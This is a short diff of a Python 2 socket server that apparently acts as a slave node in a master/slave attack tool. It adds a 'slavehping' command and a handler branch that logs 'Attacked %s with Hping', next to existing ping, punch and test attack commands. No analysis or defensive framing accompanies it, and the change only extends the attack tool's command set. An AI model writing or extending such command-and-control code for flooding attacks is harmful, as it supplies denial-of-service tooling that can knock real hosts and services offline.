@@ -10,6 +10,7 @@ master='master'
 ping='slaveping'
 punch= "slavepunch"
 test = "slavetest"
+hping = 'slavehping'
 slaveping='udp'
 global ipAdd
 global numPing
@@ -52,6 +53,10 @@ def handler(clientsock,addr):
 			elif data == test:
 				clientsock.send(ipAdd)
 				print >>sys.stderr, 'Attacked %s with Test' % ipAdd
+				break
+			elif data == hping:
+				clientsock.send(ipAdd)
+				print >>sys.stderr, 'Attacked %s with Hping' % ipAdd
 				break
 			elif data == slaveping:
 				clientsock.send(ipAdd)
